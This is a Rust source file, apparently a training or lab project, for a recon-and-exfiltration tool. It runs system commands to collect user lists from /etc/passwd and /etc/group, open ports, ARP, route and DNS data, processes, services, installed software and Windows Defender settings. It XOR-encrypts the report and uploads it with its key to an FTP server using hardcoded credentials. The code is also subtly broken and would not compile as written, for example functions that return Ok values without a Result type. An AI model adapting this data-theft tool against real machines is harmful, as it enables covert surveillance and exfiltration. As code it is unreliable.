// Imports
use std::io::{Bytes, Cursor, Write};
use std::process::Command;
use ftp::FtpStream;
use rand::random;
use chrono;

fn main()
{
    // Begin collecting local machine information
    let recon_buffer = recon();

    // Create & authenticate a connection to an FTP server
    let mut ftp_stream = match FtpStream::connect("127.0.0.1:20")
    {
        Ok(ftp_stream) => ftp_stream,
        Err(_) =>
            {
            println!("Failed to connect to FTP server");
			
            // Write buffer to new file "sus.txt"
            let mut file = match std::fs::File::create("sus.txt")
            {
                Ok(file) => file,
                Err(_) =>
                    {
                        println!("Failed to create file");
                        return;
                    }
            };
            match file.write_all(recon_buffer.unwrap().as_bytes())
            {
                Ok(_) => (),
                Err(_) =>
                    {
                        println!("Failed to write to file");
                        return;
                    }
            };
            return;
            },
    };
    let _ = ftp_stream.login("test-user", "Colony~Confider7~Commute").unwrap();

    // Change into a relative directory; retrieve (GET) a file from the FTP server in the current working directory (CWD)
    let _ = ftp_stream.cwd("test_data").unwrap();
    let remote_file = match ftp_stream.simple_retr("northeastern_sp_23_courses.txt")
    {
        Ok(remote_file) =>
            {
                // Save the file to local CWD
                let mut local_file = std::fs::File::create("northeastern_sp_23_courses.txt").unwrap();
                std::io::copy(&mut Cursor::new(remote_file.get_ref()), &mut local_file).unwrap();
            },
        Err(_) =>
            {
                println!("Failed to retrieve file");
            }
    };

	// Encrypt new file; format date/time for filename
    let key = generate_key().unpack();
    let cipher_text = encrypt(recon_buffer.unwrap(), key.clone());
    let date_time = chrono::Local::now().format("%Y-%m-%d_%H-%M-%S").to_string();
    let report_name = format!("{}_{}", gethostname().unwrap(), date_time);

    // Upload the key to the FTP server
    let mut key_reader = Cursor::new(key.clone());
    let key_file_name = format!("{}_key.txt", report_name.clone());
    let _ = ftp_stream.put(&key_file_name.to_string(), &mut key_reader);
    println!("Key file transmission complete");

    // Store (PUT) a file from the client to the current working directory of the server.
    let mut reader = Cursor::new(cipher_text);
    let cipher_file_name = format!("{}.txt", report_name.clone());
    let _ = ftp_stream.put(&cipher_file_name.to_string(), &mut reader);
    println!("Cipher file transmission complete");

    // Terminate the connection to the server
    let _ = ftp_stream.quit();
}

//////////////////////////////////////
// Generates a random encryption key
//////////////////////////////////////
fn generate_key() -> String
{
    let mut key = String::new();
    for _ in 0..64
    {
        key.push(random::<char>());
    }
	
    // Return key
    Ok(key)
}

///////////////////////////////////////////////
// Encrypt the buffer by XORing it with a key
///////////////////////////////////////////////
fn encrypt(buffer: String, key: String) -> Vec<u8>
{
    // Initialize clear text bytes
    let mut clear_bytes = buffer.as_bytes();

    // Initialize key bytes
    let mut key_bytes = key.as_bytes();

    // Encrypt file contents
    let mut encrypted = Vec::new();
    let key_len = key.len();
    let mut i = 0;
    for byte in clear_bytes
    {
        encrypted.push(byte ^ key_bytes[i]);
        i = (i + 1) % key_len;
    }

	// Return key
    Ok(encrypted)
}

/////////////////////////////////////////////////////////////////////////////////
// Performs recon of target machine and return collected information as strings
/////////////////////////////////////////////////////////////////////////////////
fn recon() -> Result<String, std::io::Error>
{
    let mut recon_buffer = String::new();

    if cfg!(target_family = "unix")
    {
		// UNIX locals
        let uname = getos();
        let current_user = getuser();
        let user_list = getusers();
        let group_list = getgroups();
        let open_ports = getports();
        let arp_cache = getarp();
        let routing_table = getroutes();
        let dns_cache = getdns();
        let network_interfaces = getinterfaces();
        let hardware_info = gethardware();
        let applications = getapps();
        let processes = getprocs();
        let services = getservices();

        recon_buffer.push_str("\r\r\r### Begin Report ###\r\r\r");
        recon_buffer.push_str("UNIX-based OS Recon Report\r\r#############################\r\r");
        recon_buffer.push_str(&format!("uname:\r{}\r#############################\r\r", uname.unwrap()));
        recon_buffer.push_str("\r\r\r### User Information ###\r\r\r");
        recon_buffer.push_str(&format!("Current User:\r{}\r#############################\r\r", current_user.unwrap()));
        recon_buffer.push_str(&format!("User List:\r{}\r#############################\r\r", user_list.unwrap()));
        recon_buffer.push_str(&format!("Group List:\r{}\r#############################\r\r", group_list.unwrap()));
        recon_buffer.push_str("\r\r\r### Network Information ###\r\r\r");
        recon_buffer.push_str(&format!("Open Ports:\r{}\r#############################\r\r", open_ports.unwrap()));
        recon_buffer.push_str(&format!("ARP Cache:\r{}\r#############################\r\r", arp_cache.unwrap()));
        recon_buffer.push_str(&format!("Routing Table:\r{}\r#############################\r\r", routing_table.unwrap()));
        recon_buffer.push_str(&format!("DNS Cache:\r{}\r#############################\r\r", dns_cache.unwrap()));
        recon_buffer.push_str(&format!("Network Interfaces:\r{}\r#############################\r\r", network_interfaces.unwrap()));
        recon_buffer.push_str("\r\r\r### Hardware Information ###\r\r\r");
        recon_buffer.push_str(&format!("Hardware Info:\r{}\r#############################\r\r", hardware_info.unwrap()));
        recon_buffer.push_str("\r\r\r### Software Information ###\r\r\r");
        recon_buffer.push_str(&format!("Applications:\r{}\r#############################\r\r", applications.unwrap()));
        recon_buffer.push_str(&format!("Processes:\r{}\r#############################\r\r", processes.unwrap()));
        recon_buffer.push_str(&format!("Services:\r{}\r#############################\r\r", services.unwrap()));
        recon_buffer.push_str("\r\r\r### End Report ###\r\r\r");
    }

    if cfg!(target_os = "windows")
    {
		// Windows locals
        let current_user = getuser();
        let sysinfo = getos();
        let user_list = getusers();
        let group_list = getgroups();
        let open_ports = getports();
        let arp_cache = getarp();
        let routing_table = getroutes();
        let dns_cache = getdns();
        let network_interfaces = getinterfaces();
        let applications = getapps();
        let processes = getprocs();
        let services = getservices();
        let defender_info = getwindefenderinfo();

        recon_buffer.push_str("\r\r\r### Begin Report ###\r\r\r");
        recon_buffer.push_str("Windows Recon Report\r\r#############################\r\r");
        recon_buffer.push_str("\r\r\r### System Summary ###\r\r\r");
        recon_buffer.push_str(&format!("System Info:\r{}\r#############################\r\r", sysinfo.unwrap()));
        recon_buffer.push_str("\r\r\r### User Information ###\r\r\r");
        recon_buffer.push_str(&format!("Current User:\r{}\r#############################\r\r", current_user.unwrap()));
        recon_buffer.push_str(&format!("User List:\r{}\r#############################\r\r", user_list.unwrap()));
        recon_buffer.push_str(&format!("Group List:\r{}\r#############################\r\r", group_list.unwrap()));
        recon_buffer.push_str("\r\r\r### Network Information ###\r\r\r");
        recon_buffer.push_str(&format!("Open Ports:\r{}\r#############################\r\r", open_ports.unwrap()));
        recon_buffer.push_str(&format!("ARP Cache:\r{}\r#############################\r\r", arp_cache.unwrap()));
        recon_buffer.push_str(&format!("Routing Table:\r{}\r#############################\r\r", routing_table.unwrap()));
        recon_buffer.push_str(&format!("DNS Cache:\r{}\r#############################\r\r", dns_cache.unwrap()));
        recon_buffer.push_str(&format!("Network Interfaces:\r{}\r#############################\r\r", network_interfaces.unwrap()));
        recon_buffer.push_str("\r\r\r### Software Information ###\r\r\r");
        recon_buffer.push_str(&format!("Applications:\r{}\r#############################\r\r", applications.unwrap()));
        recon_buffer.push_str(&format!("Processes:\r{}\r#############################\r\r", processes.unwrap()));
        recon_buffer.push_str(&format!("Services:\r{}\r#############################\r\r", services.unwrap()));
        recon_buffer.push_str("\r\r\r### Antivirus Information ###\r\r\r");
        recon_buffer.push_str(&format!("Windows Defender Info:\r{}\r#############################\r\r", defender_info.unwrap()));
        recon_buffer.push_str("\r\r\r### End Report ###\r\r\r");
    }

    Ok(recon_buffer)
}

//////////////////////////////////////////////
// Retrieves hostname of the current machine
//////////////////////////////////////////////
fn gethostname() -> Result<String, std::io::Error>
{
    let output = Command::new("hostname")
        .output()
        .expect("failed to execute process");
    let hostname = String::from_utf8_lossy(&output.stdout);
	
    Ok(hostname.to_string())
}

////////////////////////////////////////////
// Retrieves OS version of current machine
////////////////////////////////////////////
fn getos() -> Result<String, std::io::Error>
{
    let mut os = String::new();

    // 'uname' for UNIX
    if cfg!(target_family = "unix")
    {
        let output = Command::new("uname")
            .arg("-a")
            .output()
            .expect("failed to execute process");
        os = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // systeminfo for Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("systeminfo")
            .output()
            .expect("failed to execute process");
        os = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // Return error if unknown
    else
    {
        os = "Unknown OS".to_string();
    }

    Ok(os)
}

///////////////////////////////////////
// Retrieves username of current user
///////////////////////////////////////
fn getuser() -> Result<String, std::io::Error>
{
    let output = Command::new("whoami")
        .output()
        .expect("failed to execute process");
    let user = String::from_utf8_lossy(&output.stdout);
	
    Ok(user.to_string())
}

////////////////////////////////////////////
// Retrieves open ports of current machine
////////////////////////////////////////////
fn getports() -> Result<String, std::io::Error>
{
    let ports;
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("netstat")
            .arg("-tulpn")
            .output()
            .expect("failed to execute process");
        ports = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows-based
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("netstat")
            .arg("-ano")
            .output()
            .expect("failed to execute process");
        ports = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        ports = "unknown".to_string();
    }

    Ok(ports)
}

//////////////////////////////////////////////////////////
// Records all applications installed on current machine
//////////////////////////////////////////////////////////
fn getapps() -> Result<String, std::io::Error>
{
    let mut apps = "".to_string();
	
    // Determine Linux Distros
    if cfg!(target_os = "linux")
    {
        let output = Command::new("cat")
            .arg("/etc/os-release")
            .output()
            .expect("failed to execute process");
        let distro = String::from_utf8_lossy(&output.stdout);
        // If on Ubuntu
        if distro.contains("Ubuntu")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Debian
        else if distro.contains("Debian")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Fedora
        else if distro.contains("Fedora")
        {
            let output = Command::new("rpm")
                .arg("-qa")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on CentOS
        else if distro.contains("CentOS")
        {
            let output = Command::new("rpm")
                .arg("-qa")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Arch
        else if distro.contains("Arch")
        {
            let output = Command::new("pacman")
                .arg("-Q")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Manjaro
        else if distro.contains("Manjaro")
        {
            let output = Command::new("pamac")
                .arg("list")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on openSUSE
        else if distro.contains("openSUSE")
        {
            let output = Command::new("rpm")
                .arg("-qa")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Gentoo
        else if distro.contains("Gentoo")
        {
            let output = Command::new("equery")
                .arg("list")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Alpine
        else if distro.contains("Alpine")
        {
            let output = Command::new("apk")
                .arg("list")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Void
        else if distro.contains("Void")
        {
            let output = Command::new("xbps-query")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Solus
        else if distro.contains("Solus")
        {
            let output = Command::new("eopkg")
                .arg("list-installed")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on NixOS
        else if distro.contains("NixOS")
        {
            let output = Command::new("nix-env")
                .arg("-q")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Red Hat
        else if distro.contains("Red Hat")
        {
            let output = Command::new("rpm")
                .arg("-qa")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on SUSE
        else if distro.contains("SUSE")
        {
            let output = Command::new("rpm")
                .arg("-qa")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Slackware
        else if distro.contains("Slackware")
        {
            let output = Command::new("ls")
                .arg("/var/log/packages")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Mint
        else if distro.contains("Mint")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on elementary OS
        else if distro.contains("elementary")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Pop!_OS
        else if distro.contains("Pop")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Kali
        else if distro.contains("Kali")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Parrot
        else if distro.contains("Parrot")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Rocky
        else if distro.contains("Rocky")
        {
            let output = Command::new("rpm")
                .arg("-qa")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
    }

    // If on MacOS
    else if cfg!(target_os = "MacOS")
    {
        let output = Command::new("brew")
            .arg("list")
            .output()
            .expect("failed to execute process");
        apps = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If on Android
    else if cfg!(target_os = "android")
    {
        let output = Command::new("pm")
            .arg("list")
            .output()
            .expect("failed to execute process");
        apps = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-AppxPackage")
            .output()
            .expect("failed to execute process");
        apps = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        apps = "Unknown OS".to_string();
    }

    Ok(apps)
}

///////////////////////////////////////////////////////
// Retrieves all processes running on current machine
///////////////////////////////////////////////////////
fn getprocs() -> Result<String, std::io::Error>
{
    let procs;
	
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("ps")
            .arg("-aux")
            .output()
            .expect("failed to execute process");
        procs = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-Process")
            .output()
            .expect("failed to execute process");
        procs = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        procs = "Unknown OS".to_string();
    }

    Ok(procs)
}

////////////////////////////////////////////
// Determines all users on current machine
////////////////////////////////////////////
fn getusers() -> Result<String, std::io::Error>
{
    let users;
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("cat")
            .arg("/etc/passwd")
            .output()
            .expect("failed to execute process");
        users = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-LocalUser")
            .output()
            .expect("failed to execute process");
        users = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        users = "Unknown OS".to_string();
    }

    Ok(users)
}

//////////////////////////////////////////////////
// Determines all user groups on current machine
//////////////////////////////////////////////////
fn getgroups() -> Result<String, std::io::Error>
{
    let groups;
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("cat")
            .arg("/etc/group")
            .output()
            .expect("failed to execute process");
        groups = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-LocalGroup")
            .output()
            .expect("failed to execute process");
        groups = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        groups = "Unknown OS".to_string();
    }

    Ok(groups)
}

/////////////////////////////////////////////////////////
// Determines all network interfaces on current machine
/////////////////////////////////////////////////////////
fn getinterfaces() -> Result<String, std::io::Error>
{
    let interfaces;
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("ifconfig")
            .output()
            .expect("failed to execute process");
        interfaces = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-NetAdapter")
            .output()
            .expect("failed to execute process");
        interfaces = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        interfaces = "Unknown OS".to_string();
    }

    Ok(interfaces)
}

///////////////////////////////////////////////
// Determines all services on current machine
///////////////////////////////////////////////
fn getservices() -> Result<String, std::io::Error>
{
    let services;
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("systemctl")
            .arg("list-units")
            .output()
            .expect("failed to execute process");
        services = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-Service")
            .output()
            .expect("failed to execute process");
        services = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        services = "Unknown OS".to_string();
    }

    Ok(services)
}

//////////////////////////////////////////////////////////////////////////////////
// Determines Windows Defender exclusions and firewall rules for Windows systems
//////////////////////////////////////////////////////////////////////////////////
fn getwindefenderinfo() -> Result<String, std::io::Error>
{
    let defender;
	
    // If Windows
    if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-MpPreference")
            .output()
            .expect("failed to execute process");
        defender = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If on other OS
    else
    {
        defender = "non-windows OS".to_string();
    }

    Ok(defender)
}

////////////////////////
// Retrieves ARP table
////////////////////////
fn getarp() -> Result<String, std::io::Error>
{
    let arp;
	
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("arp")
            .arg("-a")
            .output()
            .expect("failed to execute process");
        arp = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-NetNeighbor")
            .output()
            .expect("failed to execute process");
        arp = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        arp = "Unknown OS".to_string();
    }
	
    Ok(arp)
}

////////////////////////////
// Retrieves Routing Table
////////////////////////////
fn getroutes() -> Result<String, std::io::Error>
{
    let route;
    // If on UNIX-based system
    if cfg!(target_family = "unix")
    {
        let output = Command::new("route")
            .arg("-n")
            .output()
            .expect("failed to execute process");
        route = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-NetRoute")
            .output()
            .expect("failed to execute process");
        route = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        route = "Unknown OS".to_string();
    }

    Ok(route)
}

////////////////////////
// Retrieves DNS Cache
////////////////////////
fn getdns() -> Result<String, std::io::Error>
{
    let dns;
	
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("cat")
            .arg("/etc/resolv.conf")
            .output()
            .expect("failed to execute process");
        dns = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-DnsClientCache")
            .output()
            .expect("failed to execute process");
        dns = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        dns = "Unknown OS".to_string();
    }

    Ok(dns)
}

///////////////////////////////////
// Retrieves hardware information
///////////////////////////////////
fn gethardware() -> Result<String, std::io::Error>
{
    let hardware;
	
    // If on UNIX-based system
    if cfg!(target_family = "unix")
    {
        let output = Command::new("lshw")
            .output()
            .expect("failed to execute process");
        hardware = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        hardware = "Unknown OS".to_string();
    }

    Ok(hardware)
}